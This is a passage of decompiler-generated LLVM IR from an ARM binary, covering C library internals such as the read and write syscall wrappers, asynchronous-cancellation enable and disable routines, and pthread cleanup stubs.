  br i1 %v2_14300, label %bb9, label %bb

bb:                                               ; preds = %bb11, %bb10, %dec_label_pc_1430c, %dec_label_pc_142f0
  %merge = phi i32 [ %v0_14300, %dec_label_pc_142f0 ], [ %v0_14330, %dec_label_pc_1430c ], [ %v0_14340, %bb10 ], [ %v8_14350, %bb11 ]
  ret i32 %merge

bb9:                                              ; preds = %dec_label_pc_142f0
  %v0_14308 = call i32 @__syscall_error()
  br label %dec_label_pc_1430c

dec_label_pc_1430c:                               ; preds = %entry.dec_label_pc_1430c_crit_edge, %bb9
  %v3_1430c = phi i32 [ %v3_1430c.pre, %entry.dec_label_pc_1430c_crit_edge ], [ %v0_14308, %bb9 ]
  store i32 %v3_1430c, i32* %stack_var_-24, align 4
  %v9_1430c = load i32, i32* @r2, align 4
  %v12_1430c = load i32, i32* @r3, align 4
  %v15_1430c = load i32, i32* @r7, align 4
  store i32 %v15_1430c, i32* %stack_var_-8, align 4
  %v18_1430c = load i32, i32* @lr, align 4
  %v0_14310 = call i32 @__libc_enable_asynccancel()
  %v2_14318 = load i32, i32* %stack_var_-24, align 4
  store i32 %arg2, i32* @r1, align 4
  store i32 %v9_1430c, i32* @r2, align 4
  store i32 %v12_1430c, i32* @r3, align 4
  store i32 %v2_14318, i32* @r7, align 4
  %v1_1432c = call i32 @__libc_disable_asynccancel(i32 %v0_14310)
  %v0_14330 = load i32, i32* @r7, align 4
  store i32 %v0_14330, i32* @r0, align 4
  %v2_14334 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_14334, i32* @r7, align 4
  store i32 %v18_1430c, i32* @lr, align 4
  %v2_14338 = icmp ugt i32 %v0_14330, -4097
  %v7_14338 = icmp eq i32 %v0_14330, -4096
  store i1 %v7_14338, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_14338, label %bb10, label %bb

bb10:                                             ; preds = %dec_label_pc_1430c
  %v0_14340 = call i32 @__syscall_error()
  %v0_14350 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_14350, label %bb11, label %bb

bb11:                                             ; preds = %bb10
  %v1_14350 = load i32, i32* @r1, align 4
  %v2_14350 = load i32, i32* @r4, align 4
  %v3_14350 = udiv i32 %v2_14350, 65536
  %v4_14350 = mul i32 %v2_14350, 65536
  %v5_14350 = or i32 %v3_14350, %v4_14350
  %v8_14350 = and i32 %v5_14350, %v1_14350
  br label %bb

; uselistorder directives
  uselistorder i32 %v0_14330, { 0, 2, 3, 1 }
  uselistorder i32 %v0_14300, { 1, 0, 2 }
  uselistorder label %dec_label_pc_1430c, { 1, 0 }
}

define i32 @__GI___write_nocancel() local_unnamed_addr {
entry:
  %v0_14364 = load i1, i1* @cpsr_c, align 1
  br i1 %v0_14364, label %bb1, label %bb

bb:                                               ; preds = %entry
  %v2_14364 = load i32, i32* @r0, align 4
  ret i32 %v2_14364

bb1:                                              ; preds = %entry
  %v0_14368 = call i32 @__syscall_error()
  ret i32 %v0_14368
}

define i32 @__GI___libc_write(i32 %arg1, i64* %arg2) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %tmp = ptrtoint i64* %arg2 to i32
  store i32 %arg1, i32* @r0, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_14374 = load i32, i32* @global_var_24be0.533, align 4
  %v2_14378 = icmp eq i32 %v3_14374, 0
  store i1 %v2_14378, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_14378, label %dec_label_pc_14380, label %entry.dec_label_pc_1439c_crit_edge

entry.dec_label_pc_1439c_crit_edge:               ; preds = %entry
  %v3_1439c.pre = load i32, i32* @r0, align 4
  br label %dec_label_pc_1439c

dec_label_pc_14380:                               ; preds = %entry
  %v0_14390 = load i32, i32* @r0, align 4
  %v2_14390 = icmp ugt i32 %v0_14390, -4097
  %v7_14390 = icmp eq i32 %v0_14390, -4096
  store i1 %v7_14390, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_14390, label %bb11, label %bb

bb:                                               ; preds = %bb13, %bb12, %dec_label_pc_1439c, %dec_label_pc_14380
  %merge = phi i32 [ %v0_14390, %dec_label_pc_14380 ], [ %v0_143c0, %dec_label_pc_1439c ], [ %v0_143d0, %bb12 ], [ %v7_143e0, %bb13 ]
  ret i32 %merge

bb11:                                             ; preds = %dec_label_pc_14380
  %v0_14398 = call i32 @__syscall_error()
  br label %dec_label_pc_1439c

dec_label_pc_1439c:                               ; preds = %entry.dec_label_pc_1439c_crit_edge, %bb11
  %v3_1439c = phi i32 [ %v3_1439c.pre, %entry.dec_label_pc_1439c_crit_edge ], [ %v0_14398, %bb11 ]
  %v15_1439c = load i32, i32* @r3, align 4
  %v18_1439c = load i32, i32* @r7, align 4
  store i32 %v18_1439c, i32* %stack_var_-8, align 4
  %v21_1439c = load i32, i32* @lr, align 4
  %v0_143a0 = call i32 @__libc_enable_asynccancel()
  store i32 %tmp, i32* @r1, align 4
  store i32 %v15_1439c, i32* @r3, align 4
  store i32 %v3_1439c, i32* @r7, align 4
  %v1_143bc = call i32 @__libc_disable_asynccancel(i32 %v0_143a0)
  %v0_143c0 = load i32, i32* @r7, align 4
  store i32 %v0_143c0, i32* @r0, align 4
  %v2_143c4 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_143c4, i32* @r7, align 4
  store i32 %v21_1439c, i32* @lr, align 4
  %v2_143c8 = icmp ugt i32 %v0_143c0, -4097
  %v7_143c8 = icmp eq i32 %v0_143c0, -4096
  store i1 %v7_143c8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_143c8, label %bb12, label %bb

bb12:                                             ; preds = %dec_label_pc_1439c
  %v0_143d0 = call i32 @__syscall_error()
  %v0_143e0 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_143e0, label %bb13, label %bb

bb13:                                             ; preds = %bb12
  %v1_143e0 = load i32, i32* @r1, align 4
  %v2_143e0 = inttoptr i32 %v1_143e0 to i64*
  %v3_143e0 = load i64, i64* %v2_143e0, align 4
  %v6_143e0 = udiv i64 %v3_143e0, 4294967296
  %v7_143e0 = trunc i64 %v6_143e0 to i32
  br label %bb

; uselistorder directives
  uselistorder i32 %v0_143c0, { 0, 2, 3, 1 }
  uselistorder i32 %v0_14390, { 1, 0, 2 }
  uselistorder label %dec_label_pc_1439c, { 1, 0 }
}

define i32 @__read_nocancel() local_unnamed_addr {
entry:
  %v0_143f4 = load i1, i1* @cpsr_c, align 1
  br i1 %v0_143f4, label %bb1, label %bb

bb:                                               ; preds = %entry
  %v2_143f4 = load i32, i32* @r0, align 4
  ret i32 %v2_143f4

bb1:                                              ; preds = %entry
  %v0_143f8 = call i32 @__syscall_error()
  ret i32 %v0_143f8

; uselistorder directives
  uselistorder i1* @cpsr_c, { 1, 2, 3, 4, 0 }
}

define i32 @__libc_read(i32 %arg1) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r0, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_14404 = load i32, i32* @global_var_24be0.533, align 4
  %v2_14408 = icmp eq i32 %v3_14404, 0
  br i1 %v2_14408, label %dec_label_pc_14410, label %entry.dec_label_pc_1442c_crit_edge

entry.dec_label_pc_1442c_crit_edge:               ; preds = %entry
  %v3_1442c.pre = load i32, i32* @r0, align 4
  br label %dec_label_pc_1442c

dec_label_pc_14410:                               ; preds = %entry
  %v0_14420 = load i32, i32* @r0, align 4
  %v2_14420 = icmp ugt i32 %v0_14420, -4097
  br i1 %v2_14420, label %bb8, label %bb

bb:                                               ; preds = %dec_label_pc_1442c, %dec_label_pc_14410
  %merge = phi i32 [ %v0_14420, %dec_label_pc_14410 ], [ %v0_14450, %dec_label_pc_1442c ]
  ret i32 %merge

bb8:                                              ; preds = %dec_label_pc_14410
  %v0_14428 = call i32 @__syscall_error()
  br label %dec_label_pc_1442c

dec_label_pc_1442c:                               ; preds = %entry.dec_label_pc_1442c_crit_edge, %bb8
  %v3_1442c = phi i32 [ %v3_1442c.pre, %entry.dec_label_pc_1442c_crit_edge ], [ %v0_14428, %bb8 ]
  %v6_1442c = load i32, i32* @r1, align 4
  %v15_1442c = load i32, i32* @r7, align 4
  store i32 %v15_1442c, i32* %stack_var_-8, align 4
  %v18_1442c = load i32, i32* @lr, align 4
  %v0_14430 = call i32 @__libc_enable_asynccancel()
  store i32 %v6_1442c, i32* @r1, align 4
  store i32 %v3_1442c, i32* @r7, align 4
  %v1_1444c = call i32 @__libc_disable_asynccancel(i32 %v0_14430)
  %v0_14450 = load i32, i32* @r7, align 4
  store i32 %v0_14450, i32* @r0, align 4
  %v2_14454 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_14454, i32* @r7, align 4
  store i32 %v18_1442c, i32* @lr, align 4
  %v2_14458 = icmp ugt i32 %v0_14450, -4097
  br i1 %v2_14458, label %bb9, label %bb

bb9:                                              ; preds = %dec_label_pc_1442c
  %v0_14460 = call i32 @__syscall_error()
  ret i32 %v0_14460

; uselistorder directives
  uselistorder i32 %v0_14450, { 1, 2, 0 }
  uselistorder i32 ()* @__syscall_error, { 5, 4, 11, 7, 6, 10, 1, 0, 9, 3, 2, 8 }
  uselistorder label %dec_label_pc_1442c, { 1, 0 }
}

define i32 @__libc_disable_asynccancel(i32 %arg1) local_unnamed_addr {
entry:
  %cpsr_c.global-to-local = alloca i1, align 1
  %r0.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-16 = alloca i32, align 4
  %v0_14470 = load i32, i32* %r0.global-to-local, align 4
  %v1_14470 = and i32 %v0_14470, 2
  %v2_14470 = icmp eq i32 %v1_14470, 0
  %v3_14474 = load i32, i32* @r4, align 4
  store i32 %v3_14474, i32* %stack_var_-16, align 4
  br i1 %v2_14470, label %dec_label_pc_1447c, label %dec_label_pc_144f0

dec_label_pc_1447c:                               ; preds = %entry
  %v0_1447c = call i32 @__aeabi_read_tp()
  store i32 %v0_1447c, i32* %r0.global-to-local, align 4
  %v1_14480 = add i32 %v0_1447c, -1036
  %v2_14480 = inttoptr i32 %v1_14480 to i32*
  %v3_14480 = load i32, i32* %v2_14480, align 4
  %v1_14484 = add i32 %v0_1447c, -1168
  store i32 %v1_14484, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_14488

dec_label_pc_14488:                               ; preds = %dec_label_pc_144bc.dec_label_pc_14488_crit_edge, %dec_label_pc_1447c
  %v0_14494 = phi i32 [ %v0_14494.pre, %dec_label_pc_144bc.dec_label_pc_14488_crit_edge ], [ %v1_14484, %dec_label_pc_1447c ]
  %v0_14488 = phi i32 [ %v0_144bc, %dec_label_pc_144bc.dec_label_pc_14488_crit_edge ], [ %v3_14480, %dec_label_pc_1447c ]
  %v1_14488 = and i32 %v0_14488, -3
  store i32 %v1_14488, i32* %r7.global-to-local, align 4
  store i32 %v0_14488, i32* %r4.global-to-local, align 4
  store i32 %v1_14488, i32* @r1, align 4
  %v1_14494 = add i32 %v0_14494, 132
  store i32 %v1_14494, i32* @r2, align 4
  %v1_1449823 = inttoptr i32 %v1_14494 to i32*
  %v2_1449824 = load i32, i32* %v1_1449823, align 4
  %v3_1449c26 = icmp uge i32 %v2_1449824, %v0_14488
  store i1 %v3_1449c26, i1* %cpsr_c.global-to-local, align 1
  %v9_1449c32 = icmp eq i32 %v2_1449824, %v0_14488
  br i1 %v9_1449c32, label %dec_label_pc_144a4, label %dec_label_pc_144bc

dec_label_pc_144a4:                               ; preds = %dec_label_pc_14488, %dec_label_pc_144a4.dec_label_pc_14498_crit_edge
  %v0_144a433 = phi i32 [ %v1_1449c.pre, %dec_label_pc_144a4.dec_label_pc_14498_crit_edge ], [ %v0_14488, %dec_label_pc_14488 ]
  store i32 %v0_144a433, i32* %r0.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_144b4 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_144b4, label %dec_label_pc_144b8, label %dec_label_pc_144a4.dec_label_pc_14498_crit_edge

dec_label_pc_144a4.dec_label_pc_14498_crit_edge:  ; preds = %dec_label_pc_144a4
  %v0_14498.pre = load i32, i32* @r2, align 4
  %v1_1449c.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_14498 = inttoptr i32 %v0_14498.pre to i32*
  %v2_14498 = load i32, i32* %v1_14498, align 4
  %v3_1449c = icmp uge i32 %v2_14498, %v1_1449c.pre
  store i1 %v3_1449c, i1* %cpsr_c.global-to-local, align 1
  %v9_1449c = icmp eq i32 %v2_14498, %v1_1449c.pre
  br i1 %v9_1449c, label %dec_label_pc_144a4, label %dec_label_pc_144bc

dec_label_pc_144b8:                               ; preds = %dec_label_pc_144a4
  %v0_144b8 = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_144bc

dec_label_pc_144bc:                               ; preds = %dec_label_pc_14488, %dec_label_pc_144a4.dec_label_pc_14498_crit_edge, %dec_label_pc_144b8
  %v0_144bc = phi i32 [ %v0_144b8, %dec_label_pc_144b8 ], [ %v2_1449824, %dec_label_pc_14488 ], [ %v2_14498, %dec_label_pc_144a4.dec_label_pc_14498_crit_edge ]
  %v1_144bc = phi i32 [ %v0_144b8, %dec_label_pc_144b8 ], [ %v0_14488, %dec_label_pc_14488 ], [ %v1_1449c.pre, %dec_label_pc_144a4.dec_label_pc_14498_crit_edge ]
  %v3_144bc = icmp uge i32 %v0_144bc, %v1_144bc
  store i1 %v3_144bc, i1* %cpsr_c.global-to-local, align 1
  %v9_144bc = icmp eq i32 %v0_144bc, %v1_144bc
  br i1 %v9_144bc, label %dec_label_pc_144e4.preheader, label %dec_label_pc_144bc.dec_label_pc_14488_crit_edge

dec_label_pc_144bc.dec_label_pc_14488_crit_edge:  ; preds = %dec_label_pc_144bc
  %v0_14494.pre = load i32, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_14488

dec_label_pc_144e4.preheader:                     ; preds = %dec_label_pc_144bc
  %v0_144e41 = load i32, i32* %r7.global-to-local, align 4
  %v1_144e42 = and i32 %v0_144e41, 12
  store i32 %v1_144e42, i32* @r3, align 4
  %v2_144e83 = icmp ugt i32 %v1_144e42, 3
  store i1 %v2_144e83, i1* %cpsr_c.global-to-local, align 1
  %v7_144e85 = icmp eq i32 %v1_144e42, 4
  br i1 %v7_144e85, label %dec_label_pc_144c8.lr.ph, label %dec_label_pc_144e4.preheader.dec_label_pc_144f0.loopexit_crit_edge

dec_label_pc_144e4.preheader.dec_label_pc_144f0.loopexit_crit_edge: ; preds = %dec_label_pc_144e4.preheader
  %v1_144f4.pre.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_144f0.loopexit

dec_label_pc_144c8.lr.ph:                         ; preds = %dec_label_pc_144e4.preheader
  %v0_144cc.pre = load i32, i32* %r5.global-to-local, align 4
  %v1_144cc = add i32 %v0_144cc.pre, 132
  %v2_144e0 = inttoptr i32 %v1_144cc to i32*
  br label %dec_label_pc_144c8

dec_label_pc_144c8:                               ; preds = %dec_label_pc_144c8.lr.ph, %dec_label_pc_144c8
  %v0_144c8 = phi i32 [ %v0_144e41, %dec_label_pc_144c8.lr.ph ], [ %v3_144e0, %dec_label_pc_144c8 ]
  store i32 %v0_144c8, i32* @r2, align 4
  store i32 %v1_144cc, i32* %r0.global-to-local, align 4
  store i32 128, i32* @r1, align 4
  store i32 240, i32* %r7.global-to-local, align 4
  %v3_144e0 = load i32, i32* %v2_144e0, align 4
  store i32 %v3_144e0, i32* %r7.global-to-local, align 4
  %v1_144e4 = and i32 %v3_144e0, 12
  store i32 %v1_144e4, i32* @r3, align 4
  %v7_144e8 = icmp eq i32 %v1_144e4, 4
  br i1 %v7_144e8, label %dec_label_pc_144c8, label %dec_label_pc_144e4.dec_label_pc_144f0.loopexit_crit_edge

dec_label_pc_144e4.dec_label_pc_144f0.loopexit_crit_edge: ; preds = %dec_label_pc_144c8
  %v2_144e8 = icmp ugt i32 %v1_144e4, 3
  store i1 %v2_144e8, i1* %cpsr_c.global-to-local, align 1
  br label %dec_label_pc_144f0.loopexit

dec_label_pc_144f0.loopexit:                      ; preds = %dec_label_pc_144e4.preheader.dec_label_pc_144f0.loopexit_crit_edge, %dec_label_pc_144e4.dec_label_pc_144f0.loopexit_crit_edge
  %v1_144f4.pre = phi i32 [ %v1_144f4.pre.pre, %dec_label_pc_144e4.preheader.dec_label_pc_144f0.loopexit_crit_edge ], [ %v1_144cc, %dec_label_pc_144e4.dec_label_pc_144f0.loopexit_crit_edge ]
  %v2_144f0.pre = load i32, i32* %stack_var_-16, align 4
  br label %dec_label_pc_144f0

dec_label_pc_144f0:                               ; preds = %dec_label_pc_144f0.loopexit, %entry
  %v1_144f4 = phi i32 [ %v1_144f4.pre, %dec_label_pc_144f0.loopexit ], [ %v0_14470, %entry ]
  %v2_144f0 = phi i32 [ %v2_144f0.pre, %dec_label_pc_144f0.loopexit ], [ %v3_14474, %entry ]
  store i32 %v2_144f0, i32* @r4, align 4
  ret i32 %v1_144f4

; uselistorder directives
  uselistorder i32 %v3_144e0, { 1, 2, 0 }
  uselistorder i32 %v1_144cc, { 0, 2, 1 }
  uselistorder i32 %v0_144b8, { 1, 0 }
  uselistorder i32 %v1_1449c.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v0_14488, { 0, 1, 2, 3, 5, 4 }
  uselistorder i32* %r4.global-to-local, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 4, 3, 5, 0, 1 }
  uselistorder i1* %cpsr_c.global-to-local, { 1, 2, 3, 5, 4, 0 }
  uselistorder label %dec_label_pc_144f0.loopexit, { 1, 0 }
  uselistorder label %dec_label_pc_144c8, { 1, 0 }
  uselistorder label %dec_label_pc_144bc, { 2, 1, 0 }
  uselistorder label %dec_label_pc_144a4, { 1, 0 }
}

define i32 @__libc_enable_asynccancel() local_unnamed_addr {
entry:
  %cpsr_c.global-to-local = alloca i1, align 1
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %v3_144f8 = load i32, i32* @r4, align 4
  store i32 %v3_144f8, i32* %stack_var_-24, align 4
  store i32 54476, i32* %r8.global-to-local, align 4
  %v0_14500 = call i32 @__aeabi_read_tp()
  %v1_14504 = add i32 %v0_14500, -1036
  %v2_14504 = inttoptr i32 %v1_14504 to i32*
  %v3_14504 = load i32, i32* %v2_14504, align 4
  store i32 %v3_14504, i32* %r6.global-to-local, align 4
  %v1_14508 = add i32 %v0_14500, -1168
  store i32 %v1_14508, i32* %r7.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_219e0.355 to i32), i32* %r8.global-to-local, align 4
  %v1_1451046 = or i32 %v3_14504, 2
  store i32 %v1_1451046, i32* %r5.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v9_1451449 = icmp eq i32 %v1_1451046, %v3_14504
  br i1 %v9_1451449, label %dec_label_pc_145c0, label %dec_label_pc_1451c

dec_label_pc_1451c:                               ; preds = %entry, %bb.dec_label_pc_1451c_crit_edge
  %v0_14520 = phi i32 [ %v0_14520.pre, %bb.dec_label_pc_1451c_crit_edge ], [ %v1_14508, %entry ]
  %v1_1451051 = phi i32 [ %v1_14510, %bb.dec_label_pc_1451c_crit_edge ], [ %v1_1451046, %entry ]
  %v0_1452450 = phi i32 [ %v1_14550, %bb.dec_label_pc_1451c_crit_edge ], [ %v3_14504, %entry ]
  store i32 %v1_1451051, i32* @r1, align 4
  %v1_14520 = add i32 %v0_14520, 132
  store i32 %v1_14520, i32* @r2, align 4
  store i32 %v0_1452450, i32* %r4.global-to-local, align 4
  %v1_1452834 = inttoptr i32 %v1_14520 to i32*
  %v2_1452835 = load i32, i32* %v1_1452834, align 4
  store i32 %v2_1452835, i32* @r3, align 4
  %v3_1452c37 = icmp uge i32 %v2_1452835, %v0_1452450
  store i1 %v3_1452c37, i1* %cpsr_c.global-to-local, align 1
  %v9_1452c43 = icmp eq i32 %v2_1452835, %v0_1452450
  br i1 %v9_1452c43, label %dec_label_pc_14534, label %dec_label_pc_1454c

dec_label_pc_14534:                               ; preds = %dec_label_pc_1451c, %dec_label_pc_14534.dec_label_pc_14528_crit_edge
  call void @__pseudo_branch(i32 -61504)
  %v0_14544 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_14544, label %dec_label_pc_14548, label %dec_label_pc_14534.dec_label_pc_14528_crit_edge

dec_label_pc_14534.dec_label_pc_14528_crit_edge:  ; preds = %dec_label_pc_14534
  %v0_14528.pre = load i32, i32* @r2, align 4
  %v1_1452c.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_14528 = inttoptr i32 %v0_14528.pre to i32*
  %v2_14528 = load i32, i32* %v1_14528, align 4
  store i32 %v2_14528, i32* @r3, align 4
  %v3_1452c = icmp uge i32 %v2_14528, %v1_1452c.pre
  store i1 %v3_1452c, i1* %cpsr_c.global-to-local, align 1
  %v9_1452c = icmp eq i32 %v2_14528, %v1_1452c.pre
  br i1 %v9_1452c, label %dec_label_pc_14534, label %dec_label_pc_1454c

dec_label_pc_14548:                               ; preds = %dec_label_pc_14534
  %v0_14548 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_14548, i32* @r3, align 4
  br label %dec_label_pc_1454c

dec_label_pc_1454c:                               ; preds = %dec_label_pc_1451c, %dec_label_pc_14534.dec_label_pc_14528_crit_edge, %dec_label_pc_14548
  %v1_14550 = phi i32 [ %v0_14548, %dec_label_pc_14548 ], [ %v2_1452835, %dec_label_pc_1451c ], [ %v2_14528, %dec_label_pc_14534.dec_label_pc_14528_crit_edge ]
  %v1_1454c = load i32, i32* %r6.global-to-local, align 4
  %v3_1454c = icmp uge i32 %v1_14550, %v1_1454c
  store i1 %v3_1454c, i1* %cpsr_c.global-to-local, align 1
  %v9_1454c = icmp eq i32 %v1_14550, %v1_1454c
  br i1 %v9_1454c, label %dec_label_pc_14558, label %bb

bb:                                               ; preds = %dec_label_pc_1454c
  store i32 %v1_14550, i32* %r6.global-to-local, align 4
  %v1_14510 = or i32 %v1_14550, 2
  store i32 %v1_14510, i32* %r5.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v9_14514 = icmp eq i32 %v1_14510, %v1_14550
  br i1 %v9_14514, label %dec_label_pc_145c0, label %bb.dec_label_pc_1451c_crit_edge

bb.dec_label_pc_1451c_crit_edge:                  ; preds = %bb
  %v0_14520.pre = load i32, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_1451c

dec_label_pc_14558:                               ; preds = %dec_label_pc_1454c
  %v0_14558 = load i32, i32* %r5.global-to-local, align 4
  %v1_14558 = and i32 %v0_14558, -69
  store i32 %v1_14558, i32* @r3, align 4
  %v2_1455c = icmp ugt i32 %v1_14558, 9
  store i1 %v2_1455c, i1* %cpsr_c.global-to-local, align 1
  %v7_1455c = icmp eq i32 %v1_14558, 10
  br i1 %v7_1455c, label %dec_label_pc_14564, label %dec_label_pc_145c0

dec_label_pc_14564:                               ; preds = %dec_label_pc_14558
  %v1_14568 = load i32, i32* %r7.global-to-local, align 4
  %v2_14568 = add i32 %v1_14568, 544
  %v3_14568 = inttoptr i32 %v2_14568 to i32*
  store i32 -1, i32* %v3_14568, align 4
  %v0_1456c = load i32, i32* @r2, align 4
  store i32 %v0_1456c, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_14570

dec_label_pc_14570:                               ; preds = %dec_label_pc_145a4.dec_label_pc_14570_crit_edge, %dec_label_pc_14564
  %v0_14574 = phi i32 [ %v0_14574.pre, %dec_label_pc_145a4.dec_label_pc_14570_crit_edge ], [ %v0_1456c, %dec_label_pc_14564 ]
  %v0_14570 = load i32, i32* %r7.global-to-local, align 4
  %v1_14570 = add i32 %v0_14570, 132
  %v2_14570 = inttoptr i32 %v1_14570 to i32*
  %v3_14570 = load i32, i32* %v2_14570, align 4
  store i32 %v0_14574, i32* @r2, align 4
  store i32 %v3_14570, i32* %r4.global-to-local, align 4
  %v1_1457c = or i32 %v3_14570, 16
  store i32 %v1_1457c, i32* @r1, align 4
  %v1_1458022 = inttoptr i32 %v0_14574 to i32*
  %v2_1458023 = load i32, i32* %v1_1458022, align 4
  %v3_1458425 = icmp uge i32 %v2_1458023, %v3_14570
  store i1 %v3_1458425, i1* %cpsr_c.global-to-local, align 1
  %v9_1458431 = icmp eq i32 %v2_1458023, %v3_14570
  br i1 %v9_1458431, label %dec_label_pc_1458c, label %dec_label_pc_145a4

dec_label_pc_1458c:                               ; preds = %dec_label_pc_14570, %dec_label_pc_1458c.dec_label_pc_14580_crit_edge
  call void @__pseudo_branch(i32 -61504)
  %v0_1459c = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_1459c, label %dec_label_pc_145a0, label %dec_label_pc_1458c.dec_label_pc_14580_crit_edge

dec_label_pc_1458c.dec_label_pc_14580_crit_edge:  ; preds = %dec_label_pc_1458c
  %v0_14580.pre = load i32, i32* @r2, align 4
  %v1_14584.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_14580 = inttoptr i32 %v0_14580.pre to i32*
  %v2_14580 = load i32, i32* %v1_14580, align 4
  %v3_14584 = icmp uge i32 %v2_14580, %v1_14584.pre
  store i1 %v3_14584, i1* %cpsr_c.global-to-local, align 1
  %v9_14584 = icmp eq i32 %v2_14580, %v1_14584.pre
  br i1 %v9_14584, label %dec_label_pc_1458c, label %dec_label_pc_145a4

dec_label_pc_145a0:                               ; preds = %dec_label_pc_1458c
  %v0_145a0 = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_145a4

dec_label_pc_145a4:                               ; preds = %dec_label_pc_14570, %dec_label_pc_1458c.dec_label_pc_14580_crit_edge, %dec_label_pc_145a0
  %v0_145a4 = phi i32 [ %v0_145a0, %dec_label_pc_145a0 ], [ %v2_1458023, %dec_label_pc_14570 ], [ %v2_14580, %dec_label_pc_1458c.dec_label_pc_14580_crit_edge ]
  %v1_145a4 = phi i32 [ %v0_145a0, %dec_label_pc_145a0 ], [ %v3_14570, %dec_label_pc_14570 ], [ %v1_14584.pre, %dec_label_pc_1458c.dec_label_pc_14580_crit_edge ]
  %v3_145a4 = icmp uge i32 %v0_145a4, %v1_145a4
  store i1 %v3_145a4, i1* %cpsr_c.global-to-local, align 1
  %v9_145a4 = icmp eq i32 %v0_145a4, %v1_145a4
  br i1 %v9_145a4, label %dec_label_pc_145ac, label %dec_label_pc_145a4.dec_label_pc_14570_crit_edge

dec_label_pc_145a4.dec_label_pc_14570_crit_edge:  ; preds = %dec_label_pc_145a4
  %v0_14574.pre = load i32, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_14570

dec_label_pc_145ac:                               ; preds = %dec_label_pc_145a4
  store i32 116, i32* @r3, align 4
  %v0_145b4 = load i32, i32* %r8.global-to-local, align 4
  %v2_145b4 = add i32 %v0_145b4, 116
  %v3_145b4 = inttoptr i32 %v2_145b4 to i32*
  %v4_145b4 = load i32, i32* %v3_145b4, align 4
  store i32 %v4_145b4, i32* @ip, align 4
  call void @__pseudo_branch(i32 %v4_145b4)
  %v0_145c0.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_145c0

dec_label_pc_145c0:                               ; preds = %entry, %bb, %dec_label_pc_14558, %dec_label_pc_145ac
  %v0_145c0 = phi i32 [ %v1_14550, %dec_label_pc_14558 ], [ %v0_145c0.pre, %dec_label_pc_145ac ], [ %v3_14504, %entry ], [ %v1_14550, %bb ]
  %v2_145c4 = load i32, i32* %stack_var_-24, align 4
  store i32 %v2_145c4, i32* @r4, align 4
  ret i32 %v0_145c0

; uselistorder directives
  uselistorder i32 %v0_145a0, { 1, 0 }
  uselistorder i32 %v1_14584.pre, { 0, 2, 1 }
  uselistorder i32 %v1_14510, { 1, 2, 0 }
  uselistorder i32 %v1_1454c, { 1, 0 }
  uselistorder i32 %v1_14550, { 0, 1, 4, 3, 5, 6, 7, 2 }
  uselistorder i32 %v1_1452c.pre, { 1, 0 }
  uselistorder i32 %v0_1452450, { 2, 1, 0 }
  uselistorder i32* %r7.global-to-local, { 1, 2, 0, 3 }
  uselistorder i32* %r6.global-to-local, { 1, 0, 2, 3 }
  uselistorder i32* %r5.global-to-local, { 1, 2, 3, 4, 0 }
  uselistorder i32* %r4.global-to-local, { 1, 0, 2, 4, 3, 5 }
  uselistorder i1* %cpsr_c.global-to-local, { 3, 5, 4, 1, 6, 10, 7, 9, 8, 2, 0 }
  uselistorder i32 -1036, { 1, 2, 0 }
  uselistorder label %dec_label_pc_145c0, { 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_145a4, { 2, 1, 0 }
  uselistorder label %dec_label_pc_1458c, { 1, 0 }
  uselistorder label %dec_label_pc_1454c, { 2, 1, 0 }
  uselistorder label %dec_label_pc_14534, { 1, 0 }
  uselistorder label %dec_label_pc_1451c, { 1, 0 }
}

define i32 @__pthread_return_0() local_unnamed_addr {
entry:
  ret i32 0
}

define i32 @__pthread_mutex_init() local_unnamed_addr {
entry:
  ret i32 0
}

define i32 @_pthread_cleanup_push_defer(i32* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %arg2, i32* %arg1, align 4
  %v3_145e4 = add i32 %tmp, 4
  %v4_145e4 = inttoptr i32 %v3_145e4 to i32*
  store i32 %arg3, i32* %v4_145e4, align 4
  ret i32 %tmp
}

define i32 @_pthread_cleanup_pop_restore(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v2_145f0 = icmp eq i32 %arg2, 0
